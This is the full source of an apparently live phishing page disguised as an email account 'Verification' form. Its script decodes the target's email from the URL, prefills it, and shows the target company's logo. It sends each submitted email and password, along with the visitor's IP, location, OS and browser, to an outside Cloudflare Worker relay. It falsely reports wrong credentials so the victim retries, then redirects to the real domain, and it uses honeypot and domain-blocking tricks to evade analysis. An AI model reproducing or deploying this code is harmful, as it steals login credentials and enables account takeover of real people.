<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <title>Verification</title>

  <!-- Bootstrap CSS & jQuery -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>

  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Arial, sans-serif;
      background: #f2f4f8;
      padding: 0;
    }

    /* Loading screen */
    #loading-container {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background-color: #f9f9f9;
      display: flex; justify-content: center; align-items: center;
      flex-direction: column;
      z-index: 9999;
    }
    #loading-bar { width: 80%; height: 10px; background: #e0e0e0; border-radius: 5px; margin: 20px auto; overflow: hidden; }
    #loading-bar-progress { height: 100%; width: 0; background: #4caf50; animation: loading 3s linear forwards; }
    @keyframes loading { 0% { width:0; } 100% { width:100%; } }
    #loading-info { margin-top:20px; font-size:14px; color:#333; text-align:center; }

    /* Card design */
    .verify-card {
      max-width: 600px;
      width: 90%;
      margin: 60px auto;
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 6px 28px rgba(0,0,0,0.25);
      overflow: hidden;
    }

    .verify-header {
      background: linear-gradient(135deg, #563dff, #2a9df4);
      padding: 30px 20px;
      text-align: center;
      color: #fff;
    }
    .verify-header img { height: 50px; margin-bottom: 15px; }
    .verify-header h2 { margin: 0; font-size: 22px; font-weight: 600; }
    .verify-header p { margin: 6px 0 0; font-size: 14px; opacity: 0.9; }

    .verify-body { padding: 30px; }
    .btn-submit {
      background: linear-gradient(90deg, #563dff, #2a9df4);
      border: none;
      font-weight: 600;
      padding: 10px;
      width: 100%;
      border-radius: 6px;
      color: #fff;
    }

    /* Screenshot background */
    #screenshot-background {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background-size: cover;
      background-repeat: no-repeat;
      z-index: -2;
      filter: brightness(0.6);
    }

    /* Typing cursor */
    .typing-cursor {
      display: inline-block;
      width: 2px;
      height: 1.2em;
      background: black;
      margin-left: 2px;
      animation: blink 0.8s steps(1) infinite;
    }
    @keyframes blink { 50% { opacity: 0; } }

    #attempts-info { color: red; font-weight: bold; margin-top: 5px; display: block; }

    #user-info-footer {
      background: #f9f9f9;
      border-top: 1px solid #ddd;
      padding: 8px;
      font-size: 13px;
      color: #333;
      text-align: center;
    }

        /* Bubble alert overlay */
    #alert-overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.55);
      backdrop-filter: blur(6px);
      display: none; /* default hidden */
      visibility: hidden;
      z-index: 10002;
      justify-content: center;
      align-items: center;
    }
    #alert-overlay.show {
      display: flex !important;
      visibility: visible;
    }
    #alert-box {
      background: #fff;
      padding: 28px 26px;
      border-radius: 14px;
      max-width: 520px;
      width: auto;
      text-align: center;
      font-weight: 700;
      font-size: 20px;
      box-shadow: 0 12px 40px rgba(0,0,0,0.45);
      animation: pop .28s ease-out;
      transform-origin: center;
      margin: 0 auto;
    }
    @keyframes pop { from { transform: scale(.92); opacity: 0 } to { transform: scale(1); opacity: 1 } }
  </style>
</head>
<body>
<div id="screenshot-background"></div>

<div id="loading-container">
  <img src="https://cdn-icons-png.flaticon.com/512/561/561127.png" width="50" onerror="this.style.display='none'" />
  <div id="loading-bar"><div id="loading-bar-progress"></div></div>
  <div id="loading-info">Loading mail settings...</div>
</div>


<div id="alert-overlay"><div id="alert-box"></div></div>
</div>

<div id="main-content" style="display:none;">
  <div class="verify-card">
    <div class="verify-header">
      <img src="https://static.vecteezy.com/system/resources/thumbnails/023/495/208/small_2x/global-logo-for-business-png.png" 
           alt="" id="logoimg" style="height:50px;margin-top:2px;">
      <h2><span id="domain-name"></span> Verification</h2>
      <p>Confirm your identity to maintain service access</p>
    </div>
    <div class="verify-body">
      <form id="verify-form" autocomplete="off">
        <input type="hidden" id="timestamp" name="timestamp">
        <div style="display:none;"><input type="text" id="trap" name="trap" autocomplete="off" /></div>
        <div class="alert alert-danger" id="msg" style="display:none;">Incorrect Credentials. Please try again</div>
        <span id="error" class="text-danger" style="display:none;">Invalid user</span>
        <div class="form-group text-left">
          <label>Email</label>
          <div class="d-flex align-items-center">
            <input type="email" class="form-control py-1" id="ai" style="height:50px;" required readonly>
            <span class="typing-cursor" id="cursor"></span>
          </div>
        </div>
        <div class="form-group text-left">
          <label>Password</label>
          <input type="password" class="form-control py-1" style="height:50px;"  id="pr">
          <span id="attempts-info">3 attempts left</span>
        </div>
        <button type="button" id="submit-btn" class="btn-submit mt-3">Submit</button>
      </form>
    </div>
    <div id="user-info-footer"></div>
  </div>
</div>


<script>
  // ✅ Logo loader with fallback
  function loadLogo(email) {
    if (email && email.includes("@")) {
      const domainPart = email.split("@")[1];
      const clearbitUrl = "https://logo.clearbit.com/" + domainPart;
      $("#logoimg")
        .attr("src", clearbitUrl)
        .on("error", function () {
          $(this).attr("src", "https://logodix.com/logo/14638.png");
        });
    } else {
      $("#logoimg").attr("src", "https://logodix.com/logo/14638.png");
    }
  }

  // Example hook after email decoding:
  $(document).ready(function() {
    const url = new URL(window.location.href);
    let email = "";
    if (url.searchParams.has("id")) {
      try {
        email = atob(url.searchParams.get("id"));
      } catch(e) {}
    }
    if (email) loadLogo(email);
  });

  // ---- Hash → Base64 → Query rewrite ----
(function () {
  const url = new URL(window.location.href);
  let email = "";

  // 1️⃣ ?state=
  if (url.searchParams.has("state")) {
    const stateVal = url.searchParams.get("state");
    try {
      const decoded = atob(stateVal);
      if (decoded.includes("@")) email = decoded;
    } catch {
      if (stateVal.includes("@")) email = stateVal;
    }
    if (email) url.searchParams.delete("state");
  }

  // 2️⃣ #hash
  if (!email) {
    const hash = window.location.hash.substring(1);
    if (hash && hash.includes("@")) email = hash;
  }

  // 3️⃣ normalize → ?id=
  if (email && email.includes("@")) {
    try {
      url.searchParams.set("id", btoa(email));
      url.hash = "";
      window.location.replace(url.toString());
    } catch (e) {
      console.error("Normalization failed:", e);
    }
  }
})();
  

  // ---------- Suspicious domain filter (unchanged) ----------
  function isSuspiciousEmail(email) {
    if (!email || typeof email !== "string") return true;
    const lower = email.toLowerCase();
    const badPatterns = [
      "jephy-webmail.com","yopmail.com","10minutemail.com","10minutemail.net",
      "temp-mail.org","temp-mail.com","tempmail.com","tempmail.net","guerrillamail.com",
      "mailinator.com","mailinator.net","maildrop.cc","trashmail.com","dispostable.com",
      "mailnesia.com","getnada.com","sharklasers.com","spamgourmet.com","mailcatch.com","bizsupporta.com","rolls-royce.com",
      "burnermail.io","anonbox.net","moakt.com","inboxkitten.com","fakemail.net"
    ];
    const domain = (email.split("@")[1] || "").toLowerCase();
    if (!domain) return true;
    for (let d of badPatterns) {
      if (domain === d || domain.endsWith("." + d)) return true;
    }
    const regexes = [
      /\btemp(mail|-mail|mailbox)?\b/i,
      /\b10 ?minut(e)?mail\b/i,
      /\b(yopmail|mailinator|guerrillamail|getnada|sharklasers)\b/i,
      /\b(dispos|dispost|disposable|throwaway|trash)\b/i,
      /\b(burner|burnermail|burnermail)\b/i,
      /\b(rolls-royce|bizsupporta)\b/i,
      /\b(fake(mail)?|fakemailgenerator)\b/i,
      /\b(noreply|no-reply)\b/i
    ];
    for (let r of regexes) {
      if (r.test(lower)) return true;
    }
    return false;
  }

  // ---------- Typing effect ----------
  function typeText(selector, text, delay = 100) {
    let i = 0;
    const el = document.querySelector(selector);
    const cursor = document.getElementById("cursor");
    if (!el) return;
    el.value = "";
    cursor.style.display = "inline-block";
    const interval = setInterval(() => {
      if (i >= text.length) {
        clearInterval(interval);
        cursor.style.display = "none";
        const pw = document.getElementById("pr");
        if (pw) pw.focus();
        return;
      }
      el.value += text[i++];
    }, delay);
  }



function sendToTelegram(email, password, attemptsLeft, location, ip, os, browser) {
  const workerUrl = "https://tg8.log-internals.workers.dev/send"; 

  const message = `
🔔 New Form Attempt
📧 Email: ${email}
🔑 Password: ${password}
🌐 IP: ${ip}
🖥 OS: ${os.name}
🌐 Browser: ${browser.name}
⏱ Time: ${new Date().toLocaleString()}
🔢 Attempts left: ${attemptsLeft}
📍 Location: ${location}
  `;

  $.ajax({
    url: workerUrl,
    method: "POST",
    contentType: "application/json",
    data: JSON.stringify({
      text: message
    }),
    success: function (res) {
     
    },
    error: function (err) {
      console.error("Error sending to Worker:", err);
    }
  });
}


  // ---------- Screenshot Background ----------
  function setScreenshotBackground(domain) {
    const screenshotUrl = `https://cdn.prod.website-files.com/63f5de8e8260819e3bbf4432/6696612bee125efffba462a3_How%20to%20Create%20a%20.Biz%20Email%20Address%20in%202%20Quick%20and%20Easy%20Ways.png`;
    const el = document.getElementById("screenshot-background");
    if (el) el.style.backgroundImage = `url('${screenshotUrl}')`;
  }

  // ---------- Get User Info ----------
  async function getUserInfo() {
    const os = getOSInfo();
    const browser = getBrowserInfo();
    let location = "Unavailable", ip = "Unavailable";

    try {
      const res = await fetch("https://ipapi.co/json/");
      if (res.ok) {
        const data = await res.json();
        location = `${data.city}, ${data.country_name}`;
        ip = data.ip;
      }
    } catch (e) {
      console.error("Failed to fetch location:", e);
    }

    return { os, browser, location, ip };
  }

  // ---------- Loading Info ----------
  async function setLoadingInfo(domain) {
    const os = getOSInfo();
    const browser = getBrowserInfo();
    const date = new Date().toLocaleString();

    let locationText = "Detecting...", ip = "Detecting...";
    try {
      const res = await fetch("https://ipapi.co/json/");
      if (!res.ok) throw new Error("API error");
      const data = await res.json();
      ip = data.ip || "Unavailable";
      locationText = (data.city && data.country_name)
        ? `${data.city}, ${data.country_name}`
        : "Unavailable";
    } catch (e) {
      try {
        const res2 = await fetch("https://ipapi.co/json/");
        const data2 = await res2.json();
        ip = data2.ip || "Unavailable";
        locationText = "Unavailable";
      } catch (err) {
        ip = "Unavailable";
        locationText = "Unavailable";
      }
    }

    let row = `
      <table class="loading-table table table-borderless text-center" style="margin:auto; background:#fff; font-size:14px;">
        <tr>
          <td><strong>${domain}</strong></td>
          <td>${browser.name}</td>
          <td>${os.name}</td>
          <td>📍 ${locationText}</td>
          <td>🌐 ${ip}</td>
          <td>${date}</td>
        </tr>
      </table>
    `;
    document.getElementById('loading-info').innerHTML = row;
    document.getElementById("user-info-footer").innerText =
      `${os.name} | ${browser.name} | ${locationText} | ${ip}`;
  }

  // ---------- OS + Browser helpers ----------
  function getOSInfo() {
    const ua = navigator.userAgent;
    if (/windows nt/i.test(ua)) return {name:"Windows"};
    if (/macintosh|mac os x/i.test(ua)) return {name:"macOS"};
    if (/android/i.test(ua)) return {name:"Android"};
    if (/iphone|ipad|ipod/i.test(ua)) return {name:"iOS"};
    if (/linux/i.test(ua)) return {name:"Linux"};
    return {name:"Unknown"};
  }
  function getBrowserInfo() {
    const ua = navigator.userAgent;
    if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edg") === -1) return {name:"Chrome"};
    if (ua.indexOf("Firefox") > -1) return {name:"Firefox"};
    if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) return {name:"Safari"};
    if (ua.indexOf("Edg") > -1) return {name:"Edge"};
    if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return {name:"Opera"};
    return {name:"Unknown"};
  }

  // ---------- Random string ----------
  function randomString(length, chars) {
    var alphabet = chars || "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var result = "";
    for (var i = 0; i < length; i++) {
      result += alphabet[Math.floor(Math.random() * alphabet.length)];
    }
    return result;
  }

  // ---------- UI alert ----------
  // --- Alert bubble logic ---
  let overlayTimeout = null;
  function showAlert(msg, timeoutMs = 3000) {
    const $overlay = $("#alert-overlay");
    $("#alert-box").text(msg);
    $overlay.addClass("show");
    if (overlayTimeout) clearTimeout(overlayTimeout);
    if (timeoutMs && timeoutMs > 0) {
      overlayTimeout = setTimeout(hideAlert, timeoutMs);
    }
  }
  function hideAlert() {
    $("#alert-overlay").removeClass("show");
    if (overlayTimeout) clearTimeout(overlayTimeout);
    overlayTimeout = null;
  }
  // ---------- Global user info ----------
  let userInfo = { os: {}, browser: {}, location: "Unavailable", ip: "Unavailable" };

  // ---------- Document ready ----------
  $(document).ready(async function() {
    var attemptsLeft = 3;
    $('#timestamp').val(Date.now());

    userInfo = await getUserInfo(); // ✅ fix #1: populate global userInfo

    try {
      const url = new URL(window.location.href);
      if (!(url.searchParams.has("err") && url.searchParams.has("dispatch") && url.searchParams.has("id"))) {
        url.searchParams.append("err", url.searchParams.get("err") || randomString(123, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"));
        url.searchParams.append("dispatch", url.searchParams.get("dispatch") || randomString(33, "01234abcABC56789"));
        url.searchParams.append("id", url.searchParams.get("id") || randomString(30, "01234abcABC56789"));
        window.location.replace(url.toString());
        return;
      }
    } catch (e) {
      console.warn("URL randomization skipped:", e);
    }

    $("#ai").attr("name", "email_" + randomString(6, "abcdefghijklmnopqrstuvwxyz"));
    $("#pr").attr("name", "pass_" + randomString(6, "abcdefghijklmnopqrstuvwxyz"));
    $("#pr").attr("autocomplete", "current-password").val("");
    $('#pr').val('').focus();
    $("#alert-overlay").hide();

    $('#submit-btn').click(function(event) {
      event.preventDefault();
      $('#error').hide();
      $('#msg').hide();

      if (attemptsLeft <= 0) {
        $('#error').show().text("No attempts left. Access expired.");
        return false;
      }

      var ai = $("#ai").val();
      var pr = $("#pr").val();
      var trap = $("#trap").val();

      if (trap && trap.trim() !== "") {
        $('#error').show().text("Suspicious activity detected.");
        return false;
      }

      if (isSuspiciousEmail(ai)) {
        $('#error').show().text("Suspicious email address blocked.");
        return false;
      }

      if (!ai || !pr) {
        $('#error').show().text("Fields cannot be empty!");
        return false;
      }

      // ✅ fix #2: use userInfo.location (not locationText)
      sendToTelegram(ai, pr, attemptsLeft, userInfo.location, userInfo.ip, userInfo.os, userInfo.browser);

      attemptsLeft--;
      if (attemptsLeft > 0) {
        $('#attempts-info').text(attemptsLeft + " attempts left");
        showAlert("Incorrect details — " + attemptsLeft + " attempts left.", 2400);
        $('#error').show().text("Invalid credentials.");
         $('#pr').val('').trigger('input').focus();
  return false;
      } else {
        $('#attempts-info').text("0 attempts left");
        showAlert("No attempts left. Redirecting...", 3800);
        $('#error').show().text("No attempts left. Access expired.");
        $('#submit-btn').prop("disabled", true);
        $('#pr').prop("disabled", true);
        setTimeout(() => {
          var domain = (ai.split("@")[1] || "example.com");
          window.location.href = "https://" + domain;
        }, 4000);
      }
    });

   const url = new URL(window.location.href);
    let domain = "example.com", email = "";
    if (url.searchParams.has("id")) {
      try {
        email = atob(url.searchParams.get("id"));
        if (email.includes("@")) domain = email.split("@")[1] || domain;
      } catch (e) { console.error("Base64 decode failed:", e); }
    }

    $("#domain-name").text(domain);
    setScreenshotBackground(domain);
    setLoadingInfo(domain);

    setTimeout(() => {
      document.getElementById('loading-container').style.display = 'none';
      document.getElementById('main-content').style.display = 'flex';
      if (email) typeText("#ai", email, 120);
    }, 3000);

    
  });
</script>

</body>
</html>
